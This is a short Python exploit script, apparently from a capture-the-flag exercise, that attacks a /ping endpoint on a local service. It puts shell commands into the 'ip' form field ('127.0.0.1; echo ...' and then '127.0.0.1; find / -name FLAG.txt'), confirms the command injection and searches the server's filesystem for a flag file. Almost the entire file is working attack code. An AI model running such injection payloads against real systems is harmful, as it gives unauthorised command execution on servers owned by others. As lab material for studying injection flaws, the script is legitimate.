import requests
import time

base_url = "http://127.0.0.1:33159"
endpoint = "/ping"

print("[*] Testing connectivity to /ping endpoint")
print("[*] Attempting simple ping test first...")

# Try a simple legitimate ping first
try:
    # Use a very small timeout for initial test
    response = requests.post(
        f"{base_url}{endpoint}",
        data={"ip": "127.0.0.1"},
        timeout=3
    )
    
    print(f"[+] Connection successful!")
    print(f"[+] Status Code: {response.status_code}")
    print(f"[+] Response:\n{response.text}")
    
    # If basic ping works, try simple command injection
    print("\n[*] Testing basic command injection...")
    injection_payload = "127.0.0.1; echo 'INJECTED'"
    
    inject_response = requests.post(
        f"{base_url}{endpoint}",
        data={"ip": injection_payload},
        timeout=5
    )
    
    print(f"[+] Injection test status: {inject_response.status_code}")
    print(f"[+] Injection test response:\n{inject_response.text}")
    
    if "INJECTED" in inject_response.text:
        print("[+] Command injection confirmed!")
        
        # Now search for flag
        print("\n[*] Searching for FLAG.txt...")
        
        # Try a simple find command
        find_payload = "127.0.0.1; find / -name FLAG.txt 2>/dev/null | head -3"
        
        find_response = requests.post(
            f"{base_url}{endpoint}",
            data={"ip": find_payload},
            timeout=10
        )
        
        print(f"[+] Find command status: {find_response.status_code}")
        print(f"[+] Find command response:\n{find_response.text}")
        
except requests.exceptions.Timeout:
    print("[-] Request timed out - service may be slow or unresponsive")
    print("[-] Try increasing timeout...")
except requests.exceptions.ConnectionError as e:
    print(f"[-] Connection error: {e}")
    print("[-] Service may not be running or port is incorrect")
except Exception as e:
    print(f"[-] Unexpected error: {e}")
